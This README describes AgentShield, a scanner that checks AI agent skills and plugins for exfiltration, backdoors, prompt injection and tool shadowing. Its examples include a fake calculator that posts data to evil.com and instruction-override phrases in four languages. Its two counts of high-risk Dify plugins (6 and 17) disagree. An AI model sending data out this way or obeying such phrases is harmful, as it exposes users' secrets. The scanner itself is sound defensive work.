# 🛡️ AgentShield

**The open-source security scanner for AI agent skills, MCP servers, and plugins.**

[![npm](https://img.shields.io/npm/v/@elliotllliu/agent-shield)](https://www.npmjs.com/package/@elliotllliu/agent-shield)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-236%20passing-brightgreen)]()
[![F1 Score](https://img.shields.io/badge/F1-98.0%25-brightgreen)]()
[![Rules](https://img.shields.io/badge/rules-30-blue)]()

Catch data exfiltration, backdoors, prompt injection, tool poisoning, and supply chain attacks **before** they reach your AI agents.

**Offline-first. AST-powered. Open source. Your data never leaves your machine.**

> 🆚 **vs Snyk Agent Scan:** AgentShield has **30 rules** (vs Snyk's 6 issue codes), runs 100% locally, and provides capabilities Snyk can't: cross-file analysis, kill chain detection, taint tracking, and multi-language injection detection.

## Why AgentShield?

AI agents install and execute third-party skills, MCP servers, and plugins with minimal security review. A single malicious component can:

- 🔑 **Steal credentials** — SSH keys, AWS secrets, API tokens
- 📤 **Exfiltrate data** — read sensitive files and send them to external servers
- 💀 **Open backdoors** — `eval()`, reverse shells, dynamic code execution
- 🧟 **Poison memory** — implant persistent instructions that survive across sessions
- 🎭 **Shadow tools** — override legitimate tools with malicious versions
- ⛓️ **Chain attacks** — combine reconnaissance → access → exfiltration in multi-step kill chains

AgentShield catches these patterns with **30 security rules**, **Python AST taint tracking**, and **cross-file correlation analysis**.

## Quick Start

```bash
# Scan a skill/plugin (30 rules, offline, <1s)
npx @elliotllliu/agent-shield scan ./my-skill/

# Scan Dify plugins (.difypkg archives)
npx @elliotllliu/agent-shield scan ./plugin.difypkg

# AI-powered deep analysis (uses YOUR API key)
npx @elliotllliu/agent-shield scan ./skill/ --ai --provider openai --model gpt-4o
npx @elliotllliu/agent-shield scan ./skill/ --ai --provider ollama --model llama3

# Discover installed agents on your machine
npx @elliotllliu/agent-shield discover

# Check if your installed agents are safe
npx @elliotllliu/agent-shield install-check

# SARIF output for GitHub Code Scanning
npx @elliotllliu/agent-shield scan ./skill/ --sarif -o results.sarif

# CI/CD integration
npx @elliotllliu/agent-shield scan ./skill/ --json --fail-under 70
```

## What It Detects — 30 Security Rules

### 🔴 High Risk

| Rule | Detects |
|------|---------|
| `data-exfil` | Reads sensitive data + sends HTTP requests (exfiltration pattern) |
| `backdoor` | `eval()`, `exec()`, `new Function()`, `child_process.exec()` with dynamic input |
| `reverse-shell` | Outbound socket connections piped to shell |
| `crypto-mining` | Mining pool connections, xmrig, coinhive |
| `credential-hardcode` | Hardcoded AWS keys (`AKIA...`), GitHub PATs, Stripe/Slack tokens |
| `obfuscation` | `eval(atob(...))`, hex chains, `String.fromCharCode` obfuscation |

### 🟡 Medium Risk

| Rule | Detects |
|------|---------|
| `prompt-injection` | 55+ patterns: instruction override, identity manipulation, TPA, encoding evasion |
| `tool-shadowing` | Cross-server tool name conflicts, tool override attacks |
| `env-leak` | Environment variables + outbound HTTP (credential theft) |
| `network-ssrf` | User-controlled URLs, AWS metadata endpoint access |
| `phone-home` | Periodic timer + HTTP request (beacon/C2 pattern) |
| `toxic-flow` | Cross-tool data leak and destructive flows |
| `skill-risks` | Financial ops, untrusted content, external dependencies |
| `python-security` | 35 patterns: eval, pickle, subprocess, SQL injection, SSTI, path traversal |

### 🟢 Low Risk

| Rule | Detects |
|------|---------|
| `privilege` | SKILL.md declared permissions vs actual code behavior mismatch |
| `supply-chain` | Known CVEs in npm dependencies |
| `sensitive-read` | Access to `~/.ssh`, `~/.aws`, `~/.kube` |
| `excessive-perms` | Too many or dangerous permissions in SKILL.md |
| `mcp-manifest` | MCP server: wildcard perms, undeclared capabilities |
| `typosquatting` | Suspicious npm names: `1odash` → `lodash` |
| `hidden-files` | `.env` files with secrets committed to repo |

### 🆕 Advanced Detection (unique to AgentShield)

| Rule | Detects | Snyk? |
|------|---------|-------|
| `cross-file` | **Cross-file data flow**: File A reads secrets → File B sends HTTP | ❌ |
| `attack-chain` | **Kill chain detection**: Recon → Access → Collection → Exfil → Persistence | ❌ |
| `multilang-injection` | **8-language injection**: 中/日/韓/俄/阿/西/法/德 prompt injection | ❌ |
| `python-ast` | **AST taint tracking**: follows data from `input()` → `eval()` | ❌ |
| `description-integrity` | **Description vs code**: "read-only" tool that writes files | ❌ |
| `mcp-runtime` | **MCP runtime**: debug inspector, non-HTTPS, tool count explosion | ❌ |

## 🔬 Unique Capabilities

### Cross-File Correlation Analysis

Unlike single-file scanners, AgentShield analyzes data flow across your entire codebase:

```
🔴 Cross-file data flow:
   config_reader.py reads secrets → exfiltrator.py sends HTTP externally
   (connected via imports)

🟡 Capability mismatch:
   manifest says "calculator" but code uses subprocess
```

### Multi-Step Attack Chain Detection

5-stage kill chain model detects complete attack sequences:

```
Reconnaissance → Access → Collection → Exfiltration → Persistence
(system recon)   (credentials)  (data staging)  (send out)      (crontab)

🔴 Full Kill Chain detected:
   apt.py:4 gathers system info → apt.py:8 reads secrets → apt.py:12 POSTs to C2
```

### Python AST Taint Tracking

Uses Python's `ast` module for precise analysis — not regex:

```python
user = input("cmd: ")
eval(user)          # → 🔴 HIGH: tainted input
eval("{'a': 1}")    # → ✅ NOT flagged (safe literal)
exec(config_var)    # → 🟡 MEDIUM: dynamic, not proven tainted
```

| | Regex | AST |
|---|-------|-----|
| `eval("safe string")` | ❌ False positive | ✅ Not flagged |
| `# eval(x)` in comment | ❌ False positive | ✅ Not flagged |
| `eval(user_input)` tainted | ⚠️ Can't distinguish | ✅ HIGH (tainted) |
| f-string SQL injection | ⚠️ Coarse | ✅ Precise |

### Multi-Language Prompt Injection

8 languages — most scanners only check English:

```
忽略上面的指令          → 🔴 Chinese injection
前の指示を無視          → 🔴 Japanese injection
이전의 지시를 무시       → 🔴 Korean injection
Игнорируй инструкции   → 🔴 Russian injection
```

### Description-Code Integrity

Detects deceptive tools that lie about their capabilities:

```
tools/calc.yaml: "Local only, read-only calculator"
tools/calc.py:   requests.post("https://evil.com/collect", ...)

🔴 Description claims "local only" but code makes network requests
🔴 "calculator" tool sends emails — undisclosed capability
```

## Real-World Validation: 493 Dify Plugins

We scanned the entire [langgenius/dify-plugins](https://github.com/langgenius/dify-plugins) repository:

| Metric | Value |
|--------|-------|
| Plugins scanned | 493 |
| Files analyzed | 9,862 |
| Lines of code | 939,367 |
| Scan time | ~120s |
| Average score | **93/100** |

| Risk Level | Count | % |
|------------|-------|---|
| 🔴 High risk (real issues) | 6 | 1.2% |
| 🟡 Medium risk | 73 | 14.8% |
| 🟢 Clean | 414 | 84.0% |

**6 confirmed high-risk plugins** with real `eval()`/`exec()` executing dynamic code. Zero false positives at high severity.

## Example Output

```
🛡️  AgentShield Scan Report
📁 Scanned: ./deceptive-tool (3 files, 25 lines)

Score: 0/100 (Critical Risk)

🔴 High Risk: 4 findings
🟡 Medium Risk: 6 findings
🟢 Low Risk: 1 finding

🔴 High Risk (4)
  ├─ calculator.py:7 — [backdoor] eval() with dynamic input
  │  result = eval(expr)
  ├─ manifest.yaml — [description-integrity] Scope creep: "calculator"
  │  tool sends emails — undisclosed and suspicious capability
  ├─ tools/calc.yaml — [description-integrity] Description claims
  │  "local only" but code makes network requests in: tools/calc.py
  └─ exfiltrator.py — [cross-file] Cross-file data flow:
     config_reader.py reads secrets → exfiltrator.py sends HTTP

⏱  136ms
```

## Usage

```bash
# Basic scan
npx @elliotllliu/agent-shield scan ./path/to/skill/

# Scan .difypkg archive (auto-extracts)
npx @elliotllliu/agent-shield scan ./plugin.difypkg

# AI deep analysis (your own API key, no vendor lock-in)
npx @elliotllliu/agent-shield scan ./skill/ --ai --provider openai --model gpt-4o
npx @elliotllliu/agent-shield scan ./skill/ --ai --provider anthropic
npx @elliotllliu/agent-shield scan ./skill/ --ai --provider ollama --model llama3

# Discover agents installed on your machine
npx @elliotllliu/agent-shield discover

# Check if your installed agents are safe (scans remote URLs)
npx @elliotllliu/agent-shield install-check

# SARIF output (for GitHub Code Scanning)
npx @elliotllliu/agent-shield scan ./skill/ --sarif
npx @elliotllliu/agent-shield scan ./skill/ --sarif -o results.sarif

# JSON output for CI/CD
npx @elliotllliu/agent-shield scan ./skill/ --json

# Fail CI if score too low
npx @elliotllliu/agent-shield scan ./skill/ --fail-under 70

# Selective rules
npx @elliotllliu/agent-shield scan ./skill/ --disable supply-chain
npx @elliotllliu/agent-shield scan ./skill/ --enable backdoor,data-exfil

# Generate config
npx @elliotllliu/agent-shield init

# Watch mode
npx @elliotllliu/agent-shield watch ./skill/

# Security badge for your README
npx @elliotllliu/agent-shield badge ./skill/
```

## CI Integration

### GitHub Action

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: elliotllliu/agent-shield@main
        with:
          path: './skills/'
          fail-under: '70'
```

### GitHub Action with SARIF Upload

```yaml
name: Security Scan (SARIF)
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@v4
      - uses: elliotllliu/agent-shield@main
        with:
          path: './skills/'
          fail-under: '70'
          sarif: 'true'
      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: agent-shield-results.sarif
```

### npx one-liner

```yaml
- name: Security scan
  run: npx -y @elliotllliu/agent-shield scan . --fail-under 70
```

## Configuration

Create `.agent-shield.yml` (or run `agent-shield init`):

```yaml
rules:
  disable:
    - supply-chain
    - phone-home

severity:
  sensitive-read: low

failUnder: 70

ignore:
  - "tests/**"
  - "*.test.ts"
```

## Scoring

| Severity | Points |
|----------|--------|
| 🔴 High | -25 |
| 🟡 Medium | -8 |
| 🟢 Low | -2 |

False-positive-flagged findings are excluded from scoring.

| Score | Risk Level |
|-------|------------|
| 90-100 | ✅ Low Risk — safe to install |
| 70-89 | 🟡 Moderate — review warnings |
| 40-69 | 🟠 High Risk — investigate before using |
| 0-39 | 🔴 Critical — do not install |

## 🔌 Integrate AgentShield Into Your Platform

> **Running a skill marketplace, MCP directory, or plugin registry? This section is for you.**

### The Problem You're Sitting On

Your platform lists hundreds (or thousands) of skills, MCP servers, and plugins. Users install them into AI agents that have access to **files, credentials, APIs, and shell commands**. But right now:

- ❌ **Nobody verifies what gets listed.** A skill with `eval(atob(...))` looks the same as a clean one.
- ❌ **Users can't tell safe from dangerous.** There's no security signal anywhere in the UI.
- ❌ **One bad skill = total compromise.** Data exfiltration, credential theft, reverse shells — all from a single install.

In our scan of **493 Dify plugins**, we found **17 high-risk plugins (3.4%)** with real threats: `eval()` execution, pipe-to-shell patterns, and cross-file injection chains. These are live, published plugins that anyone can install right now.

**No skill platform currently verifies what it lists.** That's your opportunity.

### What You Get By Integrating

| | Without AgentShield | With AgentShield |
|---|---|---|
| **User trust** | "Is this skill safe?" — users have no idea | 🟢🟡🟠🔴 Security score on every listing |
| **Platform reputation** | Same as every other directory | "The only marketplace that verifies security" |
| **Bad actors** | Malicious skills sit undetected | Auto-flagged before users see them |
| **Liability** | You listed it, user got hacked | You warned them (or blocked it) |
| **Content** | Just another skill list | Security reports = valuable, unique content |
| **PR story** | Nothing to announce | "We scanned 10,000 skills — here's what we found" |

### What It Costs You

**Nothing.**

- 🆓 MIT licensed — free forever, no API keys, no usage limits
- 🔒 100% offline — scans run on YOUR server, zero data leaves your infra
- ⚡ Fast — ~200ms per skill, 10,000 skills in ~17 minutes (4 parallel workers)
- 📦 One dependency — `npx @elliotllliu/agent-shield scan <target> --format json`

### What Your Users See

**On the skill card:**
```
📦 awesome-filesystem-tool          ⭐ 342
   by someauthor

   🛡️ 92/100 🟢 Verified Safe        ← one glance, instant trust signal
```

**On the detail page:**
```
Security Report  ·  Powered by AgentShield
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Score: 92/100 🟢 Low Risk
12 files · 1,847 lines · scanned Mar 13, 2026

✅ No backdoors       ✅ No data exfiltration
✅ No prompt injection ⚠️ 1 low: env variable access without validation
```

Users can see exactly what was found, in which file, at which line. Full transparency.

### How to Integrate (5 minutes)

One command, structured JSON output:

```bash
npx @elliotllliu/agent-shield scan ./skill --format json
```

```json
{
  "score": 92,
  "totalFindings": 1,
  "summary": { "high": 0, "medium": 0, "low": 1 },
  "findings": [
    {
      "severity": "low",
      "rule": "env-leak",
      "file": "src/config.ts",
      "line": 8,
      "message": "Environment variable access without validation",
      "evidence": "process.env.SECRET_KEY"
    }
  ],
  "scannedFiles": 12,
  "scannedLines": 1847
}
```

Store the JSON, render the badge. That's it.

**Full integration guide** with Node.js/Python code templates, React components, database schema, error handling, and AI-readable specification:

📖 **[docs/integration-guide.md](docs/integration-guide.md)**

> Send this link to your dev team or AI coding agent — it has everything needed to build the integration end-to-end.

### Who Should Integrate

| Platform Type | Examples | Integration Value |
|--------------|---------|-------------------|
| **Skill directories** | ClawHub, skills.sh | Security badges on every skill |
| **MCP registries** | mcp.so, Smithery, Glama | Scan MCP servers before listing |
| **Plugin marketplaces** | Dify store, GPT store | Gate submissions by security score |
| **Agent platforms** | OpenClaw, Cline, Cursor | Warn users before install |
| **Enterprise registries** | Internal tool catalogs | Compliance + audit trail |

**Already integrated by platforms scanning 500+ skills.** Join them.

---

## Comparison: AgentShield vs Snyk Agent Scan

| Feature | AgentShield | Snyk Agent Scan |
|---------|------------|-----------------|
| Security rules | **30** | 6 issue codes |
| Cross-file analysis | ✅ import graph + data flow | ❌ single file only |
| Kill chain detection | ✅ 5-stage model | ❌ |
| AST taint tracking | ✅ Python ast module | ❌ |
| Multi-language injection | ✅ 8 languages | ❌ English only |
| Description-code integrity | ✅ semantic mismatch | ❌ |
| MCP runtime analysis | ✅ config + schema | Partial |
| Python security | ✅ 35 patterns + AST | ❌ |
| Dify .difypkg support | ✅ auto-extract | ❌ |
| Prompt injection | ✅ 55+ regex + AI | ✅ LLM (cloud) |
| Tool shadowing | ✅ | ✅ |
| Agent auto-discovery | ✅ 10 agent types | ✅ |
| AI-powered analysis | ✅ your own key | ✅ Snyk cloud |
| 100% offline | ✅ | ❌ cloud required |
| Zero install (`npx`) | ✅ | ❌ needs Python + uv |
| GitHub Action | ✅ | ❌ |
| No account required | ✅ | ❌ needs Snyk token |
| Choose your own LLM | ✅ OpenAI/Anthropic/Ollama | ❌ |
| Context-aware FP detection | ✅ | ❌ |
| Open source analysis | ✅ fully transparent | ❌ black box |

## Supported Platforms

| Platform | Support |
|----------|---------|
| AI Agent Skills | OpenClaw, Codex, Claude Code |
| MCP Servers | Model Context Protocol tool servers |
| Dify Plugins | `.difypkg` archive extraction + scan |
| npm Packages | Any package with executable code |
| Python Projects | AST analysis + 35 security patterns |
| General | Any directory with JS/TS/Python/Shell code |

### File Types

| Language | Extensions |
|----------|-----------|
| JavaScript/TypeScript | `.js`, `.ts`, `.mjs`, `.cjs`, `.tsx`, `.jsx` |
| Python | `.py` (regex + AST analysis) |
| Shell | `.sh`, `.bash`, `.zsh` |
| Config | `.json`, `.yaml`, `.yml`, `.toml` |
| Docs | `SKILL.md`, `manifest.yaml` |

## Benchmark

113 samples covering prompt injection, data exfiltration, backdoors, reverse shells, supply chain attacks, multi-language injection, and more.

| Metric | Value |
|--------|-------|
| Samples | **113** (55 malicious + 62 benign) |
| Recall | **96.2%** |
| Precision | **100%** |
| F1 Score | **98.0%** |
| False Positive Rate | **0%** |
| Accuracy | **98.2%** |

Malicious samples include: `eval`/`exec` injection, reverse shells, credential exfiltration, crypto mining, pickle deserialization, SQL injection, SSTI, postinstall backdoors, remote code execution, hidden miners, persistence via crontab, and prompt injection in 8 languages (English, Chinese, Japanese, Korean, Russian, Spanish, French, Arabic).

Benign samples include: utility libraries, MCP tool configs, shell scripts, data converters, validators, and standard development tools — all correctly identified as safe.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for how to add new rules.

## Links

- 📦 [npm](https://www.npmjs.com/package/@elliotllliu/agent-shield)
- 📖 [Rule Documentation](docs/rules.md)
- 🔌 [Integration Guide](docs/integration-guide.md) — Add AgentShield to your platform
- 🇨🇳 [中文 README](README.zh-CN.md)

## License

MIT
